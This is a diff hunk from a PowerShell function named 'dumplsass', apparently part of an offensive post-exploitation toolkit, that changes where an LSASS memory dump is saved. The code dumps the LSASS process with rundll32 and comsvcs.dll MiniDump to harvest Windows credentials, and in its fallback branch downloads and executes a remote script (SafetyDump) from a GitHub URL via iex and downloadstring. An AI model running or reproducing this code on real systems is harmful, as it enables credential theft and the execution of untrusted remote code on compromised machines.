@@ -503,13 +503,14 @@ function dumplsass
     	$dumpid = foreach ($process in $processes){if ($process.ProcessName -eq "lsass"){$process.id}}
 	Write-Host "Found lsass process with ID $dumpid - starting dump with rundll32"
 	Write-Host "Dumpfile goes to .\Exploitation\$env:computername.dmp "
-	rundll32 C:\Windows\System32\comsvcs.dll, MiniDump $dumpid $currentPath\$env:computername.dmp full
+	rundll32 C:\Windows\System32\comsvcs.dll, MiniDump $dumpid $currentPath\Exploitation\$env:computername.dmp full
 	}
 	catch{
 		Write-Host "Something went wrong, using safetykatz instead"
                  iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/SafetyDump.ps1')
-                 Write-Host -ForegroundColor Yellow 'Dumping lsass to C:\windows\temp\debug.bin :'
+                 Write-Host -ForegroundColor Yellow 'Dumping lsass to .\Exploitation\debug.bin :'
                  Safetydump
+		 move C:\windows\temp\debug.bin $currentPath\Exploitation\debug.bin
 	}
     }
     else{Write-Host "No Admin rights, start again using a privileged session!"}
